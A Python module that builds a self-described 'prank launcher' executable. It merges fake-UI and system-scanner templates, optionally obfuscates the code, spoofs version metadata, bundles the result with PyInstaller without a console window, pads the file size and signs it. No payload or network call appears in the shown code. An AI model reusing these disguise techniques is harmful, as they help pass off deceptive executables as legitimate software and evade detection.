# -*- coding: utf-8 -*-
"""
Builder Core
分离出来的核心打包逻辑，摆脱对 Tkinter GUI 的依赖
"""
import logging
import os
import re
import shutil
import subprocess
import sys
from glob import glob

# Ensure project root is in sys.path
project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if project_root not in sys.path:
    sys.path.insert(0, project_root)

from builder.utils.file_inflator import FileInflator

try:
    from builder.utils.obfuscator import obfuscate_code
except ImportError:
    from utils.obfuscator import obfuscate_code

logger = logging.getLogger(__name__)

class BuilderCore:
    def __init__(self, log_callback=None):
        """
        :param log_callback: 可选的回调函数，接收字符串消息，用于向外输出进度日志
        """
        self.log_callback = log_callback

    def _log(self, message: str):
        if self.log_callback:
            self.log_callback(message)
        logger.info(message)

    def _get_project_paths(self):
        """获取项目路径"""
        if getattr(sys, 'frozen', False):
            base_path = sys._MEIPASS
            if not os.path.exists(base_path):
                base_path = os.path.dirname(sys.executable)
            template_dir = os.path.join(base_path, "template")
            if not os.path.exists(template_dir):
                exe_dir = os.path.dirname(sys.executable)
                template_dir = os.path.join(exe_dir, "template")
                base_path = exe_dir
            return base_path, template_dir
        else:
            base_path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
            template_dir = os.path.join(base_path, "template")
            return base_path, template_dir

    def _read_template_file(self, filename: str, template_dir: str) -> str:
        filepath = os.path.join(template_dir, filename)
        if not os.path.exists(filepath):
            raise FileNotFoundError(f"模板文件不存在: {filepath}")
        with open(filepath, 'r', encoding='utf-8') as f:
            return f.read()

    def _resolve_signtool_path(self, configured_path: str) -> str:
        """优先使用显式配置，否则自动搜索系统中的 SignTool。"""
        if configured_path:
            if os.path.exists(configured_path):
                return configured_path
            raise FileNotFoundError(f"找不到 SignTool: {configured_path}")

        detected = shutil.which("signtool.exe") or shutil.which("signtool")
        if detected:
            return detected

        search_roots = [
            os.path.join(os.environ.get("ProgramFiles(x86)", ""), "Windows Kits", "10", "bin"),
            os.path.join(os.environ.get("ProgramFiles", ""), "Windows Kits", "10", "bin"),
        ]
        candidates: list[str] = []
        for root in search_roots:
            if not root or not os.path.isdir(root):
                continue
            candidates.extend(glob(os.path.join(root, "*", "x64", "signtool.exe")))
            candidates.extend(glob(os.path.join(root, "*", "x86", "signtool.exe")))

        if candidates:
            return sorted(candidates, reverse=True)[0]

        raise FileNotFoundError("未找到 SignTool，请安装 Windows SDK 或在界面中手动指定 signtool.exe 路径。")

    def _sign_output(self, exe_path: str, config: dict) -> None:
        """对最终产物执行可选的 Authenticode 签名。"""
        if not config.get("enable_signing", False):
            return

        cert_path = str(config.get("signing_cert_path", "")).strip()
        if not cert_path:
            raise ValueError("已启用代码签名，但未提供 PFX 证书路径。")
        if not os.path.exists(cert_path):
            raise FileNotFoundError(f"找不到签名证书: {cert_path}")

        signtool_path = self._resolve_signtool_path(str(config.get("signtool_path", "")).strip())
        timestamp_url = str(config.get("timestamp_url", "")).strip()
        signing_password = str(config.get("signing_password", ""))

        cmd = [
            signtool_path,
            "sign",
            "/fd",
            "SHA256",
            "/f",
            cert_path,
        ]
        if signing_password:
            cmd.extend(["/p", signing_password])
        if timestamp_url:
            cmd.extend(["/tr", timestamp_url, "/td", "SHA256"])
        cmd.append(exe_path)

        self._log("正在执行代码签名...")
        self._log(f"使用 SignTool: {signtool_path}")
        result = subprocess.run(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            encoding='utf-8',
            errors='replace',
            check=False,
        )
        output = (result.stdout or "").strip()
        if output:
            self._log(output)
        if result.returncode != 0:
            raise RuntimeError("代码签名失败，请检查证书、密码、时间戳服务与 SignTool 配置。")

        verify_cmd = [signtool_path, "verify", "/pa", exe_path]
        verify_result = subprocess.run(
            verify_cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            encoding='utf-8',
            errors='replace',
            check=False,
        )
        verify_output = (verify_result.stdout or "").strip()
        if verify_output:
            self._log(verify_output)
        if verify_result.returncode != 0:
            raise RuntimeError("签名完成，但签名校验未通过。")

        self._log("代码签名与校验完成")

    def build(self, config: dict):
        """
        核心打包流程
        :param config: 构建配置字典
        """
        try:
            self._log("=" * 50)
            self._log("开始构建恶搞启动器...")
            self._log("=" * 50)

            output_name = config.get("output_name", "output.exe")
            target_size_mb = float(config.get("target_size_mb", 0))
            icon_path = config.get("icon_path", "")

            self._log(f"目标程序: {config.get('target_exe')} ({config.get('target_name')})")
            self._log(f"输出文件: {output_name}")

            base_path, template_dir = self._get_project_paths()
            if not os.path.exists(template_dir):
                raise FileNotFoundError(f"找不到模板目录: {template_dir}")

            current_work_dir = os.getcwd()
            build_dir = os.path.join(current_work_dir, "temp_build_env")
            output_dir = os.path.join(current_work_dir, "output")

            if os.path.exists(build_dir):
                shutil.rmtree(build_dir)
            os.makedirs(build_dir)
            if not os.path.exists(output_dir):
                os.makedirs(output_dir)

            self._log(f"构建目录: {build_dir}")

            # ============ 合并代码 ============
            self._log("正在合并代码模块...")
            fake_ui_code = self._read_template_file("fake_ui.py", template_dir)
            launcher_core_code = self._read_template_file("launcher_core.py", template_dir)
            boot_code = self._read_template_file("boot.py", template_dir)

            # 读取 scanner 子模块
            scanner_dir = os.path.join(template_dir, "scanner")
            scanner_modules_code = ""
            for mod_name in ["base_scanner.py", "cache_scanner.py", "registry_scanner.py", "drive_scanner.py"]:
                mod_path = os.path.join(scanner_dir, mod_name)
                if os.path.exists(mod_path):
                    mod_code = self._read_template_file(os.path.join("scanner", mod_name), template_dir)
                    # 移除相对导入（合并后所有类已在同一文件中）
                    mod_code = re.sub(r'from\s+\..*?import.*\n', '', mod_code)
                    scanner_modules_code += f"\n# --- Scanner Module: {mod_name} ---\n{mod_code}\n"
                    self._log(f"  已读取扫描器模块: {mod_name}")

            # 移除 launcher_core 中的 scanner 包导入（合并后不需要）
            launcher_core_code = re.sub(
                r'try:\s*\n\s*from scanner import.*?\n.*?pass\s*\n',
                '# (scanner modules inlined above)\n',
                launcher_core_code,
                flags=re.DOTALL
            )

            if 'if __name__ == "__main__":' in fake_ui_code:
                fake_ui_code = fake_ui_code.split('if __name__ == "__main__":')[0]

            runtime_config = {
                "target_exe": config.get("target_exe", ""),
                "target_name": config.get("target_name", ""),
                "fallback_url": config.get("fallback_url", ""),
                "window_title": config.get("window_title", ""),
                "error_message": config.get("error_message", ""),
                "splash_image_data": config.get("splash_image_data", ""),
                "show_log": True
            }

            config_str = "CONFIG = " + repr(runtime_config)
            boot_code = re.sub(
                r"# --- CONFIG START ---.*# --- CONFIG END ---",
                f"# --- CONFIG START ---\n{config_str}\n# --- CONFIG END ---",
                boot_code,
                flags=re.DOTALL
            )
            boot_code = re.sub(
                r"# --- IMPORTS START ---.*# --- IMPORTS END ---",
                "", boot_code, flags=re.DOTALL
            )

            final_code = f"""
# === MERGED BUILD ===
import os
import sys
import atexit
import threading
import time
import json
import datetime
import webbrowser
import winreg
import ctypes
import concurrent.futures
import tkinter as tk
from tkinter import ttk
import random
from pathlib import Path
from typing import Optional, List, Set, Callable
import base64

# --- Scanner Modules (inlined) ---
{scanner_modules_code}

# --- Module: launcher_core ---
{launcher_core_code}

# --- Module: fake_ui ---
{fake_ui_code}

# --- Module: boot ---
{boot_code}
"""
            # ============ 代码混淆（可选） ============
            if config.get("enable_obfuscation", False):
                self._log("正在进行代码混淆...")
                try:
                    final_code = obfuscate_code(final_code)
                    self._log("代码混淆完成")
                except Exception as obf_err:
                    self._log(f"警告: 代码混淆失败，将使用未混淆版本 ({obf_err})")

            boot_file = os.path.join(build_dir, "boot.py")
            with open(boot_file, "w", encoding="utf-8") as f:
                f.write(final_code)

            self._log("代码合并完成")

            # ============ 生成版本信息 ============
            version_file_path = None
            try:
                version_str = config.get("meta_version", "1.0.0.0")
                if not re.match(r'^\d+\.\d+\.\d+\.\d+$', version_str):
                    version_str = "1.0.0.0"
                version_tuple = tuple(map(int, version_str.split('.')))

                ver_template = self._read_template_file("version_info_template.txt", template_dir)
                ver_content = ver_template.format(
                    file_version_tuple=version_tuple,
                    product_version_tuple=version_tuple,
                    company_name=config.get("meta_company", ""),
                    file_description=config.get("meta_desc", ""),
                    file_version=version_str,
                    internal_name=output_name,
                    copyright=config.get("meta_copyright", ""),
                    original_filename=output_name,
                    product_name=config.get("meta_desc", ""),
                    product_version=version_str
                )

                version_file_path = os.path.join(build_dir, "version_info.txt")
                with open(version_file_path, "w", encoding="utf-8") as f:
                    f.write(ver_content)
                self._log("版本信息已生成")
            except Exception as e:
                self._log(f"警告: 生成版本信息失败，将跳过元数据伪装 ({e})")

            # ============ PyInstaller 打包 ============
            self._log("正在打包 (这可能需要几分钟)...")
            try:
                subprocess.run(["pyinstaller", "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
                pyinstaller_cmd = ["pyinstaller"]
            except (subprocess.CalledProcessError, FileNotFoundError):
                local_py = os.path.join(current_work_dir, "python_embedded", "python.exe")
                local_pyinstaller = os.path.join(current_work_dir, "python_embedded", "Scripts", "pyinstaller.exe")
                if os.path.exists(local_py) and os.path.exists(local_pyinstaller):
                    self._log("使用本地嵌入式 Python 环境...")
                    pyinstaller_cmd = [local_py, "-m", "PyInstaller"]
                else:
                    raise RuntimeError("未检测到 PyInstaller，请安装。")

            cmd = pyinstaller_cmd + [
                "--onefile", "--clean", "--noconsole",
                "--noupx", # 禁用 UPX 压缩以提升启动解压速度
                "--exclude-module", "numpy",
                "--exclude-module", "pandas",
                "--exclude-module", "matplotlib",
                "--exclude-module", "PyQt5",
                "--exclude-module", "PySide2",
                "--exclude-module", "IPython",
                "--exclude-module", "scipy",
                "--collect-all", "tkinter",
                "--name", os.path.splitext(output_name)[0],
                "--distpath", output_dir,
                "--workpath", os.path.join(build_dir, "build"),
                "--specpath", build_dir,
                boot_file
            ]

            if version_file_path and os.path.exists(version_file_path):
                cmd.extend(["--version-file", version_file_path])
            if icon_path and os.path.exists(icon_path):
                cmd.extend(["--icon", icon_path])

            startupinfo = None
            if os.name == 'nt':
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW

            process = subprocess.Popen(
                cmd, cwd=build_dir, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, encoding='utf-8', errors='replace', startupinfo=startupinfo
            )

            for line in process.stdout:
                line = line.strip()
                if line:
                    self._log(line)
            process.wait()

            if process.returncode != 0:
                raise RuntimeError("打包失败，请检查 PyInstaller 是否正确安装")

            exe_path = os.path.join(output_dir, output_name)
            self._log(f"打包完成: {exe_path}")

            # ============ 文件膨胀 ============
            if target_size_mb > 0:
                self._log(f"正在执行文件膨胀 ({target_size_mb} MB)...")
                inflator = FileInflator()
                # Use standard inflate
                res = inflator.inflate_file(exe_path, target_size_mb)
                if not res.get("success"):
                    self._log(f"警告: 文件膨胀返回: {res.get('message')}")
                else:
                    self._log(f"文件膨胀完成! {res.get('message')}")

            # ============ 代码签名 ============
            self._sign_output(exe_path, config)

            # ============ 清理 ============
            self._log("清理临时文件...")
            try:
                shutil.rmtree(build_dir)
            except:
                pass

            self._log("=" * 50)
            self._log("🎉 全部完成！")
            self._log("=" * 50)

            return True, exe_path

        except Exception as e:
            error_msg = str(e)
            self._log(f"错误: {error_msg}")
            logger.exception("打包过程发生错误")
            return False, error_msg
